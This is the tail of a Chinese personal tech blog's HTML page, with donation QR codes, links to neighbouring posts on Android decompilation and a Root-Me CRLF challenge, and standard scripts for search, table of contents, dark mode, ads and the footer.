    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                        <li class="tab col s6 kofi-tab waves-effect waves-light"><a href="#kofi">KO-FI</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                    <div id="kofi">
                        <img src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/medias/reward/kofi.png" class="reward-img" alt="KO-FI 打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>

        <!-- 底部评论区广告 -->
        
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/re/androidapp-fan-bian-yi-ru-men-xue-xi-bi-ji/">
                    <div class="card-image">
                        
                        <img src="/images/article/re/05.png" class="responsive-img" alt="Android APP 反编译实战练习">
                        
                        <span class="card-title">Android APP 反编译实战练习</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2019-11-21
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B/" class="post-category">
                                    系统工程
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Android/">
                        <span class="chip bg-color">Android</span>
                    </a>
                    
                    <a href="/tags/%E9%80%86%E5%90%91/">
                        <span class="chip bg-color">逆向</span>
                    </a>
                    
                    <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/">
                        <span class="chip bg-color">反编译</span>
                    </a>
                    
                    <a href="/tags/%E5%A3%B3/">
                        <span class="chip bg-color">壳</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/safe/ctf/rootme/web-server/crlf/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/medias/featureimages/24.jpg" class="responsive-img" alt="【Root-Me】 CRLF">
                        
                        <span class="card-title">【Root-Me】 CRLF</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-05
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E8%A7%A3%E9%A2%98%E6%8A%A5%E5%91%8A/">
                        <span class="chip bg-color">解题报告</span>
                    </a>
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/Root-Me/">
                        <span class="chip bg-color">Root-Me</span>
                    </a>
                    
                    <a href="/tags/Web-Server/">
                        <span class="chip bg-color">Web-Server</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: 眈眈探求<br />'
            + '文章作者: EXP<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




<!-- 昼夜更替按钮 -->
<!-- 白天和黑夜主题 -->
<div id="sum-moon-box" class="sum-moon-box">
    <a class="btn-floating btn-large waves-effect waves-light" onclick="switchNightMode()" title="昼夜更替">
        <i id="sum-moon-icon" class="fas fa-sun" style="width:48px; height:48px; font-size: 28px;"></i>
    </a>
</div>

<!-- 昼夜切换 -->
<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
            setTimeout(function () {
                $('body').hasClass('DarkMode')
                    ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon'))
                    : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),

                    setTimeout(function () {
                        $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                            $(this).remove()
                        })
                    }, 2e3)
            })
    }
</script>


<!-- 黑夜模式持久化 -->
<script>
    /* 模式判断 */
    if (localStorage.getItem('isDark') === '1') {
        document.body.classList.add('DarkMode');
        $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')
    } else {
        document.body.classList.remove('DarkMode');
        $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')
    }
</script>


<!-- 移动端不显示昼夜切换按钮 -->
<script type="text/javascript">
    (function() {
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        if(isMobile()) {
            document.querySelector('#sum-moon-box').style.display = 'none';
        }
    })();
</script>


<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>
</div>


<!-- 侧栏浮动广告 -->

    <div id="google-ad-post-left" style="position: fixed; left: 0%; top: 42%; width: 250px; z-index: -1;">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4642672915857408" crossorigin="anonymous"></script>
    <!-- 侧栏广告-左 -->
    <ins class="adsbygoogle"
        style="display:block"
        data-ad-client="ca-pub-4642672915857408"
        data-ad-slot="1280613842"
        data-ad-format="auto"
        data-full-width-responsive="true"></ins>
    <script>
        (adsbygoogle = window.adsbygoogle || []).push({});
    </script>
</div>

<div id="google-ad-post-right" style="position: fixed; right: 0%; top: 42%; width: 250px; z-index: -1;">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4642672915857408" crossorigin="anonymous"></script>
    <!-- 侧栏广告-右 -->
    <ins class="adsbygoogle"
        style="display:block"
        data-ad-client="ca-pub-4642672915857408"
        data-ad-slot="2059343046"
        data-ad-format="auto"
        data-full-width-responsive="true"></ins>
    <script>
        (adsbygoogle = window.adsbygoogle || []).push({});
    </script>
</div>

<script type="text/javascript">
    (function() {
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        // 移动端不显示侧栏广告
        if(isMobile()) {
            document.querySelector('#google-ad-post-left ins').style.display = 'none';
            document.querySelector('#google-ad-post-right ins').style.display = 'none';

        // 加载广告
        } else {
            (adsbygoogle = window.adsbygoogle || []).push({});
        }
    })();
</script>


<!-- 当页面向下滚动超过半屏时才开始显示广告 -->
<script type="text/javascript">
    
    /*监听滚动条位置*/
    let $nav = $('#headNav');
    let $leftAd = $('#google-ad-post-left');
    let $rightAd = $('#google-ad-post-right');
    var haltHeight = $(window).height() / 2;

    // 当页面处于文章中部的时候刷新页面，因为此时无滚动，所以需要判断位置
    showOrHideSidebarAD($(window).scrollTop());
    $(window).scroll(function () {
        /* 广告根据滚动条的位置的显示和隐藏.*/
        let scroll = $(window).scrollTop();
        showOrHideSidebarAD(scroll);
    });

    function showOrHideSidebarAD(position) {
        let showPosition = haltHeight;
        if (position < showPosition) {
            $nav.addClass('nav-transparent');
            $leftAd.slideUp(300);
            $rightAd.slideUp(300);
        } else {
            $nav.removeClass('nav-transparent');
            $leftAd.slideDown(300);
            $rightAd.slideDown(300);
        }
    }
</script>
    


<!-- 看板娘 https://github.com/stevenjoezhang/live2d-widget -->




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2018-2025</span>
            
            <span id="year">2018</span>
            <a href="/about" target="_blank">EXP</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">871k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2018";
                    var startMonth = "7";
                    var startDate = "1";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
            <span id="icp"><img src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/medias/icp.png" style="vertical-align: text-bottom;" />
                <a href="https://beian.miit.gov.cn/" target="_blank">粤 ICP 备 00000000 号</a>
            </span>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/lyy289065406" class="tooltipped" target="_blank" data-tooltip="访问我的 GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:exp.lqb@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=289065406" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 289065406" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="javascript:;" class="wechat-link">
        <i class="fab fa-weixin"></i>
        <div class="wechat-qrcode">
            关注我的微信：
            <img src="/images/logo/exp-blog-wechat.jpg" alt="微信二维码">
        </div>
    </a>
      



    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/instantpage/instantpage.js" type="module"></script>
    

    <!-- 上升气泡特效 -->
    
        <!-- 上升气泡特效 -->
<script type="text/javascript">
    var windowWidth = $(window).width();
    document.write(
        '<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/lyy289065406/exp-blog@master/libs/others/buble.js"><\/script>'
    );
</script>
    
</body>

</html>
